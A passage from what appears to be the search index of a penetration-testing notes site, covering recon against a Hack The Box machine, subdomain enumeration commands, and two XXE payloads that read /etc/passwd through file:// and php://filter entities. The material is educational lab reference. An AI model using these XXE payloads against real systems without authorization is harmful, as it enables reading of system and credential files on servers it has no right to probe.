 Content-Length: 178\n  Connection: keep-alive\n  Location: http://soccer.htb/\nLocation: http://soccer.htb/ [following]\n--2024-03-01 22:32:37--  http://soccer.htb/\nResolving soccer.htb (soccer.htb)... failed: Name or service not known.\nwget: unable to resolve host address \u2018soccer.htb\u2019\n</code></pre> <p>Also sometimes <code>cURL</code> can be used to find the domain name.</p> <pre><code>curl -I &lt;IP&gt;  \n\nHTTP/1.1 301 Moved Permanently\nServer: nginx/1.18.0 (Ubuntu)\nDate: Sat, 02 Mar 2024 01:27:24 GMT\nContent-Type: text/html\nContent-Length: 178\nConnection: keep-alive\nLocation: http://soccer.htb/\n</code></pre> <p>Once we have the domain name, we can add it to the <code>/etc/hosts</code> file.</p> <pre><code>sudo nano /etc/hosts\n\n127.0.0.1       localhost\n127.0.1.1       dyallo-MS-7A39\n10.10.11.194    soccer.htb\n</code></pre> <p>Then when we access the ip address, we can see the website.</p>"},{"location":"Tutorials/web/subdomains/","title":"Subdomains","text":""},{"location":"Tutorials/web/subdomains/#sublist3r","title":"Sublist3r","text":"<pre><code>sublist3r -d &lt;DOMAIN&gt;\n</code></pre>"},{"location":"Tutorials/web/subdomains/#webcopilot","title":"Webcopilot","text":"<p>webcopilot</p> <pre><code>webcopilot -d &lt;DOMAIN&gt;\n</code></pre>"},{"location":"Tutorials/web/subdomains/#nmap","title":"Nmap","text":"<pre><code>nmap --script dns-brute &lt;DOMAIN&gt;\n</code></pre>"},{"location":"Tutorials/web/subdomains/#others","title":"Others","text":"<ul> <li>altdns</li> </ul>"},{"location":"Tutorials/web/xml/","title":"XML","text":"<p>XML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.</p>"},{"location":"Tutorials/web/xml/#xxe-xml-external-entity","title":"XXE (XML External Entity)","text":"<p>Read <code>/etc/passwd</code> file with PHP</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE data [\n&lt;!ENTITY file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt; ]&gt;\n&lt;foo&gt;\n    &lt;response&gt;&amp;file;&lt;/response&gt;\n&lt;/foo&gt;\n</code></pre> <p>Read <code>/etc/passwd</code> flat</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE data [\n&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;foo&gt;\n    &lt;response&gt;&amp;file;&lt;/response&gt;\n&lt;/foo&gt;\n</code></pre>"},{"location":"Tutorials/web/xml/#links","title":"Links","text":"<ul> <li>XXE Injection</li> </ul>"}]}